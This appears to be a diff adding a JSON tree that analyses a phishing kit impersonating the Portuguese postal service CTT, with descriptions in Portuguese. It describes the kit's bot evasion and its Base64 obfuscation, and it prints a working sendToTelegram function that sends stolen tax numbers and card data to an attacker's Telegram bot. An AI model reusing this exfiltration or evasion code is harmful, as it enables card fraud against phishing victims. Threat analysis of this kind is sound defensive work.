@@ -1,0 +1,55 @@
+{
+  "id": "root",
+  "label": "CTT Phishing Kit Analysis",
+  "type": "root",
+  "children": [
+    {
+      "id": "anti-bot",
+      "label": "Anti-Bot & Headers",
+      "type": "category",
+      "children": [
+        {
+          "id": "user-agent-check",
+          "label": "checkUserAgent()",
+          "type": "leaf",
+          "category": "Anti-Analysis",
+          "impact": "High",
+          "description": "Verifica os cabeçalhos HTTP e o User-Agent do navegador. Se detetar crawlers de cibersegurança ou ferramentas automatizadas (ex: VirusTotal, Shodan, Puppeteer), redireciona o tráfego para a página oficial dos CTT.",
+          "code": "function checkUserAgent()"
+        }
+      ]
+    },
+    {
+      "id": "obfuscation",
+      "label": "Técnicas de Ofuscação",
+      "type": "category",
+      "children": [
+        {
+          "id": "eval-decode",
+          "label": "decodePayload()",
+          "type": "leaf",
+          "category": "Evangelização / Crypto",
+          "impact": "Medium",
+          "description": "Descodifica a string codificada em Base64 e Hexadecimal em tempo de execução para esconder os URLs de exfiltração dos scanners estáticos.",
+          "code": "function decodePayload(encodedStr) {\n  const raw = atob(encodedStr);\n  return decodeURIComponent(escape(raw));\n}"
+        }
+      ]
+    },
+    {
+      "id": "exfiltration",
+      "label": "Exfiltração de Dados",
+      "type": "category",
+      "children": [
+        {
+          "id": "telegram-exfil",
+          "label": "sendToTelegram()",
+          "type": "leaf",
+          "category": "Exfiltração",
+          "impact": "Critical",
+          "description": "Captura os dados bancários (NIF, Número de Cartão, CVV e SMS OTP) e envia-os em tempo real via API do Bot do Telegram para o canal do atacante.",
+          "code": "async function sendToTelegram(formData) {\n  const botToken = '5839201948:AAH...';\n  const chatId = '-1001849204';\n  const text = `📦 *Novo Credencial CTT*\\nNIF: ${formData.nif}\\nCC: ${formData.card}`;\n\n  await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {\n    method: 'POST',\n    headers: { 'Content-Type': 'application/json' },\n    body: JSON.stringify({ chat_id: chatId, text: text, parse_mode: 'Markdown' })\n  });\n}"
+        }
+      ]
+    }
+  ]
+}
